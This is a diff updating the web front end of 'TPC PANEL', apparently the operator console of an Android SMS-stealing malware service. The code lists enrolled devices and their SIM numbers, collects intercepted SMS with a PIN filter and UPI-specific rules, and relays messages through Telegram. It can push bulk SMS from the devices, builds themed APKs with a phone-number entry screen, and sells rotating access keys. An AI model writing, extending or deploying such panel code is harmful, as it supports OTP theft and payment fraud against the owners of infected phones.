@@ -459,7 +459,7 @@ main{padding:18px 13px}
 <div><h1>TPC PANEL</h1><p>SMS &amp; APK Control</p></div>
 </div>
 <h2>Sign in</h2>
-<p>Auth backend ho to key/password daalo. Warna seedha andar aa jaoge.</p>
+<p>Admin ID + password daalo, ya apni access key (TPC-XXXX-XXXX-XXXX) se andar aao.</p>
 <form id="loginForm">
 <label for="username">Login ID / Access key</label>
 <input id="username" autocomplete="username" placeholder="admin id  ya  TPC-XXXX-XXXX-XXXX" required>
@@ -515,6 +515,7 @@ main{padding:18px 13px}
 <button class="nav on" data-page="overview" type="button"><i>▦</i> Overview</button>
 <button class="nav" data-page="live" type="button"><i>⚡</i> Live dashboard</button>
 <button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
+<button class="nav" data-page="growth" type="button"><i>📈</i> Installs</button>
 <p class="side-label" style="margin-top:22px">Automation</p>
 <button class="nav" data-page="relay" type="button"><i>📡</i> Relay</button>
 <p class="side-label" style="margin-top:22px">Builder</p>
@@ -525,7 +526,7 @@ main{padding:18px 13px}
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v7.0</div>
+<div>TPC PANEL · v7.1</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -617,7 +618,7 @@ main{padding:18px 13px}
 <div class="head"><div><h2>Relay</h2><p>Telegram channel → device SMS · device SMS → forward target</p></div><button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button></div>
 <div class="grid2">
 <section class="panel-box panel">
-<div class="panel-head"><h3>MTProto login</h3><span class="badge" id="relayState">—</span></div>
+<div class="panel-head"><h3>MTProto login</h3><span class="badge" id="relayState">—</span><span class="badge" id="relayBadge">—</span></div>
 <div class="panel-body">
 <div id="relayLoggedOut">
 <div class="field-row">
@@ -865,7 +866,7 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v7.0</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v7.1</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Backend</strong><p class="mono" id="apiBase">/</p></div>
 <div class="settings-row"><strong>APK Builder</strong><p>/api/apps · /api/builds · /api/builds/{id}/download · /api/builder/themes</p></div>
@@ -903,6 +904,7 @@ main{padding:18px 13px}
 <button data-act="fetch" type="button">⟳ fetch number</button>
 <button data-act="ping" type="button">📶 ping</button>
 <button data-act="push" type="button">📤 push pending outbox</button>
+<button data-act="rename" type="button">✎ rename device</button>
 <button data-act="copy" type="button">⧉ copy device ID</button>
 </div>
 </div>
@@ -1002,19 +1004,29 @@ const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" str
 const CFG_URL = "/api/builder/config";
 const PF_URL = "/api/builder/preflight";
 const THEMES_URL = "/api/builder/themes";
-const TKEY = "tpc.token.v12";
-const SKEY = "tpc.session.v12";
-const THEME_KEY = "tpc.theme.v12";
+const TKEY = "tpc.token.v13";
+const SKEY = "tpc.session.v13";
+const THEME_KEY = "tpc.theme.v13";
+
+const FALLBACK_THEME = {
+bg:"#0B0B0C",surface:"#151517",surfaceAlt:"#1C1C1F",accent:"#00E0B8",
+accentSoft:"#2A2A2E",border:"#2A2A2E",text:"#EAEAEA",muted:"#9A9A9F",
+field:"#1C1C1F",onAccent:"#001B16"
+};
 
 let reloginPromise = null;
 let gridSig = "";
 let liveSig = "";
+let adminProbed = false;
 
 const state = {
 auth:false, role:"user", noAuth:false, noAdmin:false,
-devices:[], messages:[], devMsgs:{}, rules:[], relay:null, relayAccount:null,
-forward:"", outbox:[], growth:null, growthEvents:[],
-apps:[], builds:[], buildCfg:null, quota:null, themes:[], pickedTheme:localStorage.getItem(THEME_KEY)||"mono",
+userId:"",
+devices:[], messages:[], devMsgs:{}, rules:[], users:[],
+relay:null, relayAccount:null, forward:"",
+outbox:[], growth:null, growthEvents:[],
+apps:[], builds:[], buildCfg:null, quota:null, themes:[],
+pickedTheme:localStorage.getItem(THEME_KEY)||"mono",
 logBuild:null, pf:null,
 pinsOnly:false, active:null, asOpen:false, toastTimer:null,
 pollTimer:null, buildTimer:null,
@@ -1082,9 +1094,9 @@ function badgeCell(row,v,force){
 const td=document.createElement("td"); const b=document.createElement("span");
 const s=String(val(v,"unknown")).toLowerCase(); b.className="badge";
 if(force&&String(force).trim())addCls(b,force);
-else if(["online","active","sent","success","bound","upi","delivered","received","ok","install"].indexOf(s)>=0)addCls(b,"ok");
+else if(["online","active","sent","success","bound","upi","delivered","received","ok","install","lifetime"].indexOf(s)>=0)addCls(b,"ok");
 else if(["pending","queued","sending","update","stale","running","prod"].indexOf(s)>=0)addCls(b,"warn");
-else if(["failed","error","offline","gone","uninstalled","canceled"].indexOf(s)>=0)addCls(b,"bad");
+else if(["failed","error","offline","gone","uninstalled","canceled","blocked","expired"].indexOf(s)>=0)addCls(b,"bad");
 b.textContent=val(v,"—"); td.appendChild(b); row.appendChild(td);
 }
 function simCell(row,slot){
@@ -1178,9 +1190,11 @@ slots:Array.isArray(t.sims)?t.sims:[]
 };
 }
 function devMsgs(d){
-const id=devId(d); if(id===null)return [];
-const c=state.devMsgs[String(id)]; if(c)return c;
-return state.messages.filter((m)=>String(m.device_id)===String(id));
+const id=String(devId(d)||""); if(!id)return [];
+if(state.devMsgs[id])return state.devMsgs[id];
+const list=state.messages.filter((m)=>String(m.device_id)===id);
+state.devMsgs[id]=list;
+return list;
 }
 function simCount(d){
 const t=tel(d);
@@ -1194,8 +1208,6 @@ const s=(nums(d).slots||[])[slot];
 const c=s&&(s.carrier||s.number);
 return c||"slot "+(slot+1);
 }
-
-/* ------------------------------ api ------------------------------ */
 
 async function api(path,options,retry){
 const o=options||{};
@@ -1220,11 +1232,10 @@ let data=null;
 if(ct.indexOf("application/json")>=0)data=await res.json().catch(()=>({}));
 else{ const txt=await res.text(); data=txt?{detail:txt}:{}; }
 
-if(res.status===404&&path.indexOf("/admin/")===0)state.noAdmin=true;
-
-if(res.status===401||res.status===403){
-const e=new Error(data.detail||data.message||"Authentication required."); e.auth=true;
-if(retry!==false&&!state.noAuth){
+if((res.status===401||res.status===403)&&!state.noAuth){
+const e=new Error(data.detail||data.message||"Authentication required.");
+e.auth=true; e.status=res.status;
+if(retry!==false){
 const ok=await relogin();
 if(ok)return api(path,options,false);
 }
@@ -1248,22 +1259,25 @@ if(s.pass) r=await api("/panel/login",{method:"POST",body:JSON.stringify({userna
 else r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:s.id})},false);
 if(r&&r.token)setToken(r.token);
 if(r&&r.role)state.role=r.role;
+if(r&&r.username)state.userId=r.username;
 return true;
-}catch(e){ return false; } finally{ reloginPromise=null; }
+}catch(e){ return false; }
 })();
-return reloginPromise;
+try{ return await reloginPromise; } finally{ reloginPromise=null; }
 }
 
 function selSlots(arr){ return (arr||[]).filter((s)=>s===0||s===1).sort(); }
 
 function attemptSend(job){
-const body={to:job.to||null,body:job.body,sim_slots:job.slots&&job.slots.length?job.slots:null};
+const payload={target:"device",device_id:job.deviceId,body:job.body};
+if(job.to)payload.to=job.to;
+if(job.slots&&job.slots.length)payload.sim_slots=job.slots;
 job.status="sending"; renderOutbox();
-return api("/admin/send",{method:"POST",body:JSON.stringify(Object.assign({target:"device",device_id:job.deviceId},body))})
+return api("/admin/send",{method:"POST",body:JSON.stringify(payload)})
 .then((r)=>{
 job.status="queued";
-job.delivered=r&&typeof r.delivered==="number"?r.delivered:0;
-job.queued=r&&typeof r.queued==="number"?r.queued:0;
+job.delivered=num(r&&r.delivered);
+job.queued=num(r&&r.queued);
 renderOutbox();
 toast("queued "+job.queued+" · delivered "+job.delivered);
 loadMessages().catch(()=>{});
@@ -1327,8 +1341,17 @@ const f=findDevice(devId(d)); const live=f?nums(f).live:null;
 toast(live?"live number: "+live:"reply ka wait karo"); }
 async function pushOutbox(d){
 try{ const r=await api("/admin/devices/"+devId(d)+"/push-outbox",{method:"POST"});
-toast("pushed "+((r&&r.pushed)||0)+" pending"); await loadMessages(); }
+toast("pushed "+num(r&&r.pushed)+" pending"); await loadMessages(); }
 catch(e){ toast(e.message); }
+}
+async function renameDevice(d){
+const cur=devName(d);
+const name=prompt("Naya device name:",cur);
+if(!name||name===cur)return;
+try{ await api("/admin/devices/"+devId(d)+"/rename",{method:"POST",body:JSON.stringify({device_name:name})});
+d.device_name=name; toast("renamed"); renderCards(true);
+if(state.active)renderDetail(state.active);
+}catch(e){ toast(e.message); }
 }
 
 function applyRole(){
@@ -1346,9 +1369,17 @@ function showApp(){ state.auth=true; $("#loginScreen").hidden=true; $("#app").hi
 
 async function afterLogin(role){
 state.role=role||"user"; applyRole();
+await probeAdmin();
 await refreshAll();
 startRealtime();
 connectUserSocket();
+}
+
+async function probeAdmin(){
+try{ await api("/admin/devices?limit=1",{},false); state.noAdmin=false; }
+catch(e){ if(e.status===404)state.noAdmin=true; }
+adminProbed=true;
+badge($("#adminBadge"),state.noAdmin?"absent":"live",state.noAdmin?"warn":"ok");
 }
 
 async function checkAuth(){
@@ -1365,7 +1396,10 @@ return;
 }
 
 const s=readSession();
-if(st&&st.authenticated){ showApp(); await afterLogin(st.role||(s&&s.role)||"admin"); return; }
+if(st&&st.authenticated){
+state.userId=st.username||"";
+showApp(); await afterLogin(st.role||(s&&s.role)||"admin"); return;
+}
 if(s){
 const ok=await relogin();
 if(ok){ showApp(); await afterLogin(state.role||s.role||"user"); return; }
@@ -1410,8 +1444,6 @@ await saveAutoSender({sim_slots:state.sel.as.slice()});
 toast("SIM selection saved");
 });
 }
-
-/* ------------------------------ renders ------------------------------ */
 
 function renderOverview(){
 const total=state.devices.length; const on=state.devices.filter(online).length;
@@ -1526,8 +1558,6 @@ body.appendChild(row);
 });
 }
 
-/* ------------------------------ growth ------------------------------ */
-
 async function loadStats(){
 if(state.noAdmin)return;
 try{ state.growth=await api("/admin/stats"); renderGrowth(); }catch(e){}
@@ -1537,7 +1567,7 @@ if(state.noAdmin)return;
 const f=$("#growthFilter")?$("#growthFilter").value:"";
 try{
 const d=await api("/admin/growth/events?limit=120");
-state.growthEvents=(d.events||[]).filter((e)=>!f||e.event===f);
+state.growthEvents=(Array.isArray(d)?d:(d.events||[])).filter((e)=>!f||e.event===f);
 }catch(e){ state.growthEvents=[]; }
 renderGrowthEvents();
 }
@@ -1581,8 +1611,6 @@ body.appendChild(row);
 });
 }
 
-/* ============================ APK BUILDER ============================ */
-
 function pickId(o){ return o ? (o.appId||o.app_id||o.id||(o._id!=null?String(o._id):null)) : null; }
 function listOf(d,k){ if(Array.isArray(d))return d; if(d&&Array.isArray(d[k]))return d[k]; return []; }
 
@@ -1592,7 +1620,7 @@ return {
 appId: pickId(a)||"—",
 name: a.name||"Untitled app",
 package: a.package||a.packageName||"—",
-theme: a.theme||a.variant_theme||"mono",
+theme: a.theme||"mono",
 secret: a.secret||null,
 secret_last4: a.secret_last4||a.secretLast4||(a.secret?String(a.secret).slice(-4):""),
 builds_total: num(a.builds_total||a.builds),
@@ -1616,18 +1644,45 @@ error: b.error||null,
 created_at: b.created_at||b.createdAt||null
 };
 }
+function normTheme(t){
+t=t||{};
+const c=(t.colors&&typeof t.colors==="object")?t.colors:{};
+const dark=t.dark!==false;
+const g=(k,fb)=>(c[k]!==undefined&&c[k]!==null&&c[k]!=="")?String(c[k]):fb;
+return {
+slug:String(t.slug||"mono"),
+label:String(t.label||t.slug||"Theme"),
+dark:dark,
+builtin:!!t.builtin,
+bg:g("background",dark?FALLBACK_THEME.bg:"#F5F6F8"),
+surface:g("surface",dark?FALLBACK_THEME.surface:"#FFFFFF"),
+surfaceAlt:g("bubbleIn",g("surface",dark?"#1C1C1F":"#EFEFEF")),
+accent:g("accent",FALLBACK_THEME.accent),
+accentSoft:g("divider",dark?"#2A2A2E":"#DADCE0"),
+border:g("divider",dark?"#2A2A2E":"#DADCE0"),
+text:g("onSurface",dark?FALLBACK_THEME.text:"#141414"),
+muted:g("onSurfaceMuted",dark?FALLBACK_THEME.muted:"#5F6368"),
+field:g("bubbleIn",dark?"#1C1C1F":"#FFFFFF"),
+onAccent:g("onAccent",FALLBACK_THEME.onAccent),
+hero:Array.isArray(t.hero)?t.hero.slice(0,3):[],
+brand:String(t.brand||""),
+tagline:String(t.tagline||""),
+logoText:String(t.logoText||"DV")
+};
+}
 
 async function loadBuilderConfig(){
 try{
 state.buildCfg=await api(CFG_URL);
 const q=state.buildCfg.queue||{};
-badge($("#bQueueBadge"),num(q.queued)+" queued · "+num(q.running)+" running",(q.running?"warn":""));
+badge($("#bQueueBadge"),num(q.queued)+" queued · "+num(q.running)+" running",(q.running?"warn":"ok"));
 builderNotice("");
 $("#bThemes").textContent=state.themes.length||listOf(state.buildCfg,"themes").length;
 }catch(e){
-try{ state.buildCfg=await api("/health/builder");
-badge($("#bQueueBadge"),"legacy health",(state.buildCfg&&state.buildCfg.status==="ok"?"ok":"warn")); }
-catch(e2){ state.buildCfg=null; badge($("#bQueueBadge"),"offline","bad"); }
+try{
+state.buildCfg=await api("/health/builder");
+badge($("#bQueueBadge"),"legacy health",(state.buildCfg&&state.buildCfg.status==="ok"?"ok":"warn"));
+}catch(e2){ state.buildCfg=null; badge($("#bQueueBadge"),"offline","bad"); }
 }
 updateBuilderMode();
 }
@@ -1642,9 +1697,9 @@ if(!ok)builderNotice("Backend reachable nahi — server.js chalao, phir /api/bui
 async function loadThemes(){
 try{
 const d=await api(THEMES_URL);
-state.themes=listOf(d,"themes");
+state.themes=listOf(d,"themes").map(normTheme);
 }catch(e){
-state.themes=(state.buildCfg&&Array.isArray(state.buildCfg.themes))?state.buildCfg.themes:[];
+state.themes=listOf(state.buildCfg||{},"themes").map(normTheme);
 }
 if(state.themes.length&&!state.themes.some((t)=>t.slug===state.pickedTheme))
 state.pickedTheme=state.themes[0].slug;
@@ -1677,12 +1732,12 @@ renderThemes(); renderThemePreview();
 function renderThemePreview(){
 const t=state.themes.find((x)=>x.slug===state.pickedTheme);
 const sc=$("#themePreview");
-if(!t){ sc.innerHTML=""; sc.style.background="#0a1226"; return; }
-const hero=(t.hero||[]).slice(0,3);
+if(!t){ sc.innerHTML=""; sc.style.background=FALLBACK_THEME.bg; return; }
+const hero=t.hero||[];
 sc.style.background=t.bg;
 sc.innerHTML=
-'<div class="tlg" style="background:'+esc(t.surface)+';border:2px solid '+esc(t.accent)+';color:'+esc(t.text)+'">'+esc(t.logoText||"DV")+'</div>'+
-'<div class="tti" style="color:'+esc(t.text)+'">'+esc(t.brand||"")+'</div>'+
+'<div class="tlg" style="background:'+esc(t.surface)+';border:2px solid '+esc(t.accent)+';color:'+esc(t.text)+'">'+esc(t.logoText)+'</div>'+
+'<div class="tti" style="color:'+esc(t.text)+'">'+esc(t.brand||t.label)+'</div>'+
 '<div class="tsu" style="color:'+esc(t.muted)+'">'+esc(t.tagline||"")+'</div>'+
 (hero.length?'<div class="tim">'+hero.map((u)=>'<i style="background-image:url('+esc(u)+')"></i>').join("")+'</div>':"")+
 '<div class="tfi" style="background:'+esc(t.field)+';border:1px solid '+esc(t.border)+';color:'+esc(t.muted)+'">10-digit mobile number</div>'+
@@ -1751,7 +1806,7 @@ body.replaceChildren();
 state.builds.forEach((b)=>{
 const row=document.createElement("tr");
 const bc=document.createElement("td"); const bb=document.createElement("span");
-bb.className="badge key mono"; bb.textContent=b.buildId.slice(-10); bc.appendChild(bb); row.appendChild(bc);
+bb.className="badge key mono"; bb.textContent=String(b.buildId).slice(-10); bc.appendChild(bb); row.appendChild(bc);
 cell(row,b.appName||b.appId||"—");
 badgeCell(row,b.status,b.status==="success"?"ok":b.status==="failed"?"bad"
 :b.status==="canceled"?"warn":b.status==="running"?"warn":"");
@@ -1818,7 +1873,7 @@ $("#secretSnippet").textContent=
 "POST "+base+"/api/orders\n"+
 "  X-App-Id: "+appId+"\n"+
 "  X-Timestamp: <epoch seconds>\n"+
-"  X-Signature: HMAC_SHA256(secret, raw_body + timestamp)  // hex\n";
+"  X-Signature: HMAC_SHA256(secret, raw_body + timestamp)\n";
 $("#secretOut").hidden=false;
 }
 
@@ -1888,7 +1943,7 @@ toast("deleted"); await loadApps(); await loadBuilds(); }catch(e){ toast(e.messa
 function downloadBuild(b){
 const a=document.createElement("a");
 a.href="/api/builds/"+b.buildId+"/download";
-a.download=(b.appName||b.appId||"app")+"-"+b.buildId.slice(-6)+".apk";
+a.download=(b.appName||b.appId||"app")+"-"+String(b.buildId).slice(-6)+".apk";
 document.body.appendChild(a); a.click(); a.remove();
 toast("download start");
 }
@@ -1896,7 +1951,7 @@ toast("download start");
 async function showBuildLog(buildId){
 state.logBuild=buildId;
 $("#logPanel").hidden=false;
-$("#logBuildId").textContent=buildId.slice(-10);
+$("#logBuildId").textContent=String(buildId).slice(-10);
 await fetchBuildLog();
 $("#logPanel").scrollIntoView({behavior:"smooth",block:"start"});
 }
@@ -1957,6 +2012,7 @@ state.wsUser.send(JSON.stringify({type:"subscribe",buildId:buildId}));
 
 function connectUserSocket(){
 if(!state.auth)return;
+if(state.wsUser&&(state.wsUser.readyState===0||state.wsUser.readyState===1))return;
 try{
 const proto=location.protocol==="https:"?"wss:":"ws:";
 const parts=[];
@@ -1975,11 +2031,9 @@ if(state.logBuild===d.buildId)fetchBuildLog();
 }
 }catch(e){}
 };
-ws.onclose=()=>{ setTimeout(()=>{ if(state.auth)connectUserSocket(); },3000); };
+ws.onclose=()=>{ state.wsUser=null; setTimeout(()=>{ if(state.auth)connectUserSocket(); },3000); };
 }catch(e){}
 }
-
-/* ------------------------------ keys ------------------------------ */
 
 function keyStatus(u){
 if(u.blocked)return{text:"blocked",kind:"bad"};
@@ -2032,6 +2086,8 @@ sc.appendChild(wrap); row.appendChild(sc);
 const ac=document.createElement("td"); const aw=document.createElement("div"); aw.className="u-actions";
 const cb=document.createElement("button"); cb.className="mini"; cb.type="button"; cb.textContent="⧉ copy";
 cb.addEventListener("click",()=>copyText(u.key||"",u.key||"")); aw.appendChild(cb);
+const rb=document.createElement("button"); rb.className="mini v"; rb.type="button"; rb.textContent="⟳";
+rb.title="rotate"; rb.addEventListener("click",()=>rotateKey(u)); aw.appendChild(rb);
 const tb=document.createElement("button"); tb.className="mini "+(u.blocked?"g":"d"); tb.type="button";
 tb.textContent=u.blocked?"Unblock":"Block"; tb.addEventListener("click",()=>toggleKey(u.id,u.blocked));
 aw.appendChild(tb);
@@ -2055,13 +2111,17 @@ async function toggleKey(id,blocked){
 try{ await api("/admin/keys/"+id+"/toggle",{method:"POST",body:JSON.stringify({blocked:!blocked})});
 toast(blocked?"unblocked":"blocked"); await loadUsers(); }catch(e){ toast(e.message); }
 }
+async function rotateKey(u){
+if(!confirm("Key rotate karein? Purani key kaam karna band kar degi."))return;
+try{ const r=await api("/admin/keys/"+u.id+"/rotate",{method:"POST"});
+$("#kValue").textContent=r.key; $("#kOut").hidden=false;
+toast("key rotated"); await loadUsers(); }catch(e){ toast(e.message); }
+}
 async function deleteKey(u){
 if(!confirm("Delete key "+(u.key||"")+"?"))return;
 try{ await api("/admin/keys/"+u.id+"/delete",{method:"POST"}); toast("deleted"); await loadUsers(); }
 catch(e){ toast(e.message); }
 }
-
-/* ------------------------------ rules ------------------------------ */
 
 function renderRules(){
 $("#ruleCount").textContent=state.rules.length+" rules";
@@ -2075,11 +2135,20 @@ const rc=document.createElement("td"); const span=document.createElement("span")
 span.className="body-cell"; span.textContent=r.reply||"—"; rc.appendChild(span); row.appendChild(rc);
 cell(row,r.upi_only?"UPI only":"All SMS");
 badgeCell(row,r.enabled?"active":"disabled");
-const act=document.createElement("td"); const btn=document.createElement("button");
+const act=document.createElement("td"); const wrap=document.createElement("div"); wrap.className="u-actions";
+const btn=document.createElement("button");
 btn.className="mini"; btn.type="button"; btn.textContent=r.enabled?"Disable":"Enable";
 btn.addEventListener("click",async()=>{ try{ await api("/admin/rules/"+r.id+"/toggle",{method:"POST"}); await loadRules(); }
 catch(e){ toast(e.message); } });
-act.appendChild(btn); row.appendChild(act);
+wrap.appendChild(btn);
+const del=document.createElement("button");
+del.className="mini d"; del.type="button"; del.textContent="del";
+del.addEventListener("click",async()=>{
+if(!confirm("Rule delete?"))return;
+try{ await api("/admin/rules/"+r.id+"/delete",{method:"POST"}); await loadRules(); }
+catch(e){ toast(e.message); } });
+wrap.appendChild(del);
+act.appendChild(wrap); row.appendChild(act);
 body.appendChild(row);
 });
 }
@@ -2369,7 +2438,6 @@ badge($("#builderBadge"),"Ready","ok");
 try{ await api("/health/builder"); badge($("#builderBadge"),"Legacy","warn"); }
 catch(e2){ badge($("#builderBadge"),"Down","bad"); }
 }
-badge($("#adminBadge"),state.noAdmin?"absent":"live",state.noAdmin?"warn":"ok");
 }
 
 async function loadDevices(){
@@ -2377,6 +2445,7 @@ if(state.noAdmin)return;
 const d=await api("/admin/devices");
 state.linkOk=true; updateLink();
 state.devices=Array.isArray(d)?d:(d.devices||[]);
+state.devMsgs={};
 safe(renderOverview); safe(renderLive); safe(renderCards);
 if(state.active){ const f=findDevice(devId(state.active));
 if(f){ state.active=f; safe(renderDetail,f); safe(renderDetailMsgs); } }
@@ -2384,10 +2453,10 @@ if(f){ state.active=f; safe(renderDetail,f); safe(renderDetailMsgs); } }
 
 function upsertMessage(m){
 const key=m.id||m._id||(m.device_id+"|"+m.created_at+"|"+m.body);
-const ex=state.messages.some((x)=>(x.id||x._id||(x.device_id+"|"+x.created_at+"|"+x.body))===key);
-if(ex)return;
+if(state.messages.some((x)=>(x.id||x._id||(x.device_id+"|"+x.created_at+"|"+x.body))===key))return;
 state.messages.unshift(m);
-const c=state.devMsgs[String(m.device_id)]; if(c)c.unshift(m);
+const id=String(m.device_id||"");
+if(state.devMsgs[id])state.devMsgs[id].unshift(m);
 renderMessages(); safe(renderLive);
 if(state.active)renderDetailMsgs();
 }
@@ -2397,6 +2466,7 @@ if(state.noAdmin)return;
 const d=await api("/admin/messages?limit=500");
 state.linkOk=true; updateLink();
 state.messages=Array.isArray(d)?d:(d.messages||[]);
+state.devMsgs={};
 renderMessages(); safe(renderLive);
 if(state.active)renderDetailMsgs();
 reconcile();
@@ -2419,7 +2489,7 @@ state.rules=Array.isArray(d)?d:(d.rules||[]); renderRules(); }
 
 async function loadUsers(){
 if(state.noAdmin)return;
-if(state.role!=="admin"&&!state.noAuth){ state.users=[]; return; }
+if(state.role!=="admin"&&!state.noAuth){ state.users=[]; renderUsers(); return; }
 try{ const d=await api("/admin/keys"); state.users=Array.isArray(d)?d:(d.keys||[]); renderUsers(); }catch(e){}
 }
 
@@ -2429,14 +2499,15 @@ try{ const d=await api("/admin/auto-sender");
 state.relayAccount=d.account||null; state.forward=d.forward_user||""; }catch(e){}
 }
 async function loadRelay(){ if(state.noAdmin)return;
-const d=await api("/admin/relay/status"); state.relay=d; renderRelay(); }
+try{ const d=await api("/admin/relay/status"); state.relay=d; renderRelay(); }catch(e){}
+}
 
 function renderRelay(){
 const r=state.relay; if(!r)return;
 const st=r.state||{}; const authed=Boolean(st.authorized);
 const label=!r.telethon?"telethon missing":authed?"connected":"not logged in";
 badge($("#relayState"),label,!r.telethon?"bad":authed?"ok":"warn");
-badge($("#relayBadge"),label,!r.telethon?"bad":authed?"ok":"warn");
+badge($("#relayBadge"),authed?"live":"idle",authed?"ok":"");
 $("#relayLoggedOut").hidden=authed; $("#relayLoggedIn").hidden=!authed;
 $("#relayCodeBox").hidden=!st.awaiting_code;
 if(authed){
@@ -2509,7 +2580,7 @@ const ws=new WebSocket(proto+"//"+location.host+"/ws/admin"+qs);
 state.ws=ws;
 ws.onopen=()=>{ state.wsOk=true; state.wsFails=0; updateLink(); };
 ws.onmessage=(ev)=>{ try{ onEvent(JSON.parse(ev.data)); }catch(e){} };
-ws.onclose=()=>{ state.wsOk=false; updateLink(); reconnect(); };
+ws.onclose=()=>{ state.wsOk=false; state.ws=null; updateLink(); reconnect(); };
 ws.onerror=()=>{ state.wsOk=false; try{ ws.close(); }catch(e){} };
 }catch(e){ reconnect(); }
 }
@@ -2588,8 +2659,6 @@ if(page==="growth")refreshSection("growth");
 if(page==="builder")refreshSection("builder");
 }
 
-/* ------------------------------ wiring ------------------------------ */
-
 function gotoBuilder(ev){ if(ev)ev.preventDefault();
 if(state.auth)navigate("builder"); else if(!$("#loginScreen").hidden)$("#username").focus(); }
 $("#apkBtn").addEventListener("click",gotoBuilder);
@@ -2627,6 +2696,7 @@ if(act==="copy"){ copyText(d.short_id||devId(d)); return; }
 if(act==="ping"){ await pingDevice(d); return; }
 if(act==="fetch"){ await fetchNumber(d); return; }
 if(act==="push"){ await pushOutbox(d); return; }
+if(act==="rename"){ await renameDevice(d); return; }
 });
 
 $("#asCollapse").addEventListener("click",()=>{ const b=$("#asBody");
@@ -2719,12 +2789,11 @@ if(!body){ toast("message khali hai"); return; }
 const slots=selSlots(state.sel.bulk||[]);
 $("#bulkSend").disabled=true;
 try{
-const r=await api("/admin/send",{method:"POST",body:JSON.stringify({
-target:$("#bulkTarget").value, body:body,
-to:$("#bulkTo").value.trim()||null,
-sim_slots:slots.length?slots:null
-})});
-toast("queued to "+r.queued+" device(s), delivered "+r.delivered+(r.note?" — "+r.note:""));
+const payload={target:$("#bulkTarget").value, body:body};
+if($("#bulkTo").value.trim())payload.to=$("#bulkTo").value.trim();
+if(slots.length)payload.sim_slots=slots;
+const r=await api("/admin/send",{method:"POST",body:JSON.stringify(payload)});
+toast("queued to "+num(r&&r.queued)+" device(s), delivered "+num(r&&r.delivered)+(r&&r.note?" — "+r.note:""));
 $("#bulkBody").value="";
 await loadMessages(); await loadStats();
 }catch(e){ toast(e.message); } finally{ $("#bulkSend").disabled=false; }
@@ -2832,6 +2901,7 @@ r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:id})},false)
 saveSession(r.username||id,null,keep,r.role);
 }
 if(r&&r.token)setToken(r.token);
+if(r&&r.username)state.userId=r.username;
 $("#password").value="";
 loginMsg("Signed in","ok");
 showApp();
@@ -2852,7 +2922,7 @@ clearSession();
 state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
 state.growth=null; state.growthEvents=[];
 state.apps=[]; state.builds=[]; state.logBuild=null; state.quota=null;
-state.pinsOnly=false; state.role="user";
+state.pinsOnly=false; state.role="user"; state.userId=""; state.noAdmin=false; adminProbed=false;
 state.sel={as:[],send:[],bulk:[]};
 gridSig=""; liveSig="";
 $("#pinsBtn").classList.remove("on");
@@ -2867,9 +2937,11 @@ $("#refreshBtn").addEventListener("click",refreshAll);
 
 document.addEventListener("click",(ev)=>{ if(!ev.target.closest(".act-wrap"))$("#actMenu").hidden=true; });
 document.addEventListener("keydown",(ev)=>{ if(ev.key==="Escape"&&!$("#detail").hidden)closeDetail(); });
-document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&state.auth&&!state.noAdmin){
-loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); }
-loadBuilds().catch(()=>{}); });
+document.addEventListener("visibilitychange",()=>{
+if(!document.hidden&&state.auth){
+if(!state.noAdmin){ loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); }
+loadBuilds().catch(()=>{});
+}});
 
 buildSimChips($("#bulkSims"),"bulk",null);
 checkAuth();
